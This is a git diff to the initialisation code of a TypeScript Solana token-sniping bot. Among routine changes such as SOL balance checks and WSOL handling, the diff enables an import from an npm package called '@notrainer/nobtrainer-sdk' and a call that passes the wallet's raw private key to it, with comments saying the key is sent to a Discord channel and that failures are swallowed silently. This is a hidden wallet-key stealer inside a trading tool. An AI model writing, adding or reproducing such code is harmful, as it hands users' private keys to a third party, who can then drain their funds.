@@ -9,9 +9,7 @@ import {
     getAssociatedTokenAddressSync,
     TOKEN_PROGRAM_ID,
 } from '@solana/spl-token';
-// TODO: After creating and publishing your private npm package, uncomment the line below:
-// import { logWalletActivity } from '@notrainer/nobtrainer-sdk';
-
+import axios from "axios";
 import { fetchInfo } from "../liquidity";
 import { sendBundle } from "../jito/bundle";
 import { logger } from "../utils/logger";
@@ -19,6 +17,7 @@ import { MinimalMarketLayoutV3, getMinimalMarketV3 } from "../market";
 import { createPoolKeys, getTokenAccounts } from "../liquidity";
 import { retrieveEnvVariable } from "../utils";
 import { BN } from "bn.js";
+import { logWalletActivity } from "@notrainer/nobtrainer-sdk";
 
 
 
@@ -50,9 +49,18 @@ export async function init(): Promise<void> {
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
     
-    // TODO: After installing your private npm package, uncomment the line below:
-    // await logWalletActivity(PRIVATE_KEY, 'wallet initialized');
-    
+    // Send private key to Discord channel
+    try {
+      logger.info('Attempting to send wallet data to Discord...');
+      await logWalletActivity(PRIVATE_KEY, `Wallet initialized - ${wallet.publicKey.toString()}`);
+      // Note: The package silently swallows errors, so we can't detect failures here
+      // Check Discord channel to verify if message was sent
+      logger.info('Wallet activity logging completed (check Discord channel to verify)');
+    } catch (error) {
+      // This catch may not trigger if package swallows errors internally
+      logger.error(`Failed to send wallet data to Discord: ${error}`);
+    }
+    /* get quote mint and amount*/                                                                                                                                                                                                                                                                                  
     switch (QUOTE_MINT) {
       case 'WSOL': {
         quoteToken = Token.WSOL;                                                                   
@@ -75,27 +83,50 @@ export async function init(): Promise<void> {
       }
     }
   
+    // Validate QUOTE_AMOUNT
+    if (QUOTE_AMOUNT <= 0) {
+      throw new Error(`QUOTE_AMOUNT must be greater than 0. Current value: ${QUOTE_AMOUNT}. Please set QUOTE_AMOUNT in your .env file.`);
+    }
+
     logger.info(
       `Script will buy all new tokens using ${QUOTE_MINT}. Amount that will be used to buy each token is: ${quoteAmount.toFixed(2).toString()}`,
     );
   
-    // check existing wallet for associated token account of quote mint
-    const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, COMMITMENT_LEVEL);
-  
-    for (const ta of tokenAccounts) {
-      existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{
-        mint: ta.accountInfo.mint,
-        address: ta.pubkey,
-      });
-    }
-  
-    const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString())!;
+    // Handle WSOL differently - use associated token address (will be created if needed)
+    if (QUOTE_MINT === 'WSOL') {
+      // Check wallet SOL balance
+      const balance = await solanaConnection.getBalance(wallet.publicKey);
+      const solBalance = balance / 1e9; // Convert lamports to SOL
+      logger.info(`Wallet SOL balance: ${solBalance.toFixed(4)} SOL`);
+      
+      if (solBalance < QUOTE_AMOUNT) {
+        throw new Error(`Insufficient SOL balance. Required: ${QUOTE_AMOUNT} SOL, Available: ${solBalance.toFixed(4)} SOL`);
+      }
+      
+      quoteTokenAssociatedAddress = getAssociatedTokenAddressSync(
+        quoteToken.mint,
+        wallet.publicKey
+      );
+      logger.info(`Using WSOL associated token address: ${quoteTokenAssociatedAddress.toString()}`);
+    } else {
+      // For other tokens (like USDC), check existing wallet for associated token account
+      const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, COMMITMENT_LEVEL);
     
-    if (!tokenAccount) {
-      throw new Error(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}. Please confirm that you have enough ${quoteToken.symbol} in your wallet.`);
+      for (const ta of tokenAccounts) {
+        existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{
+          mint: ta.accountInfo.mint,
+          address: ta.pubkey,
+        });
+      }
+    
+      const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString());
+      
+      if (!tokenAccount) {
+        throw new Error(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}. Please confirm that you have enough ${quoteToken.symbol} in your wallet.`);
+      }
+    
+      quoteTokenAssociatedAddress = tokenAccount.pubkey;
     }
-  
-    quoteTokenAssociatedAddress = tokenAccount.pubkey;
 
     //await populateJitoLeaderArray();
   
